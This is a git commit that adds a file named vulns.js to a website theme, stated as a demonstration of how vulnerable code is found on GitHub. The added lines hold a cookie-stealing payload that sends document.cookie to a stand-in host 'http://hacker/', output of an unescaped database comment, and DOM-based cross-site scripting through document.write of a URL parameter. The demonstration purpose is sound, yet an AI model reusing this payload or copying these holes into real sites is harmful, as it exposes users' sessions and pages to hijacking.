e98f3efef95e77966e2d82c11025d7f1d8ca7360
testsecurityuser123 <86075279+testsecurityuser123@users.noreply.github.com>
2021-07-13 17:03:05 -0500

    Add vuln.js file to website template
    Creating a new vuln.js template file to demonstrate how vulnerable code is found in GitHub

---
+++ user/themes/fangman-v1/js/vulns.js
@@ -0,0 +1,10 @@
+var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;
+
+print "<html>"
+print "Latest comment:"
+print database.latestComment
+print "</html>"
+
+  let startPosition = document.URL.indexOf("role=") + 5;
+    let userRole = document.URL.substring(startPosition,document.URL.length); 
+    document.write(userRole);
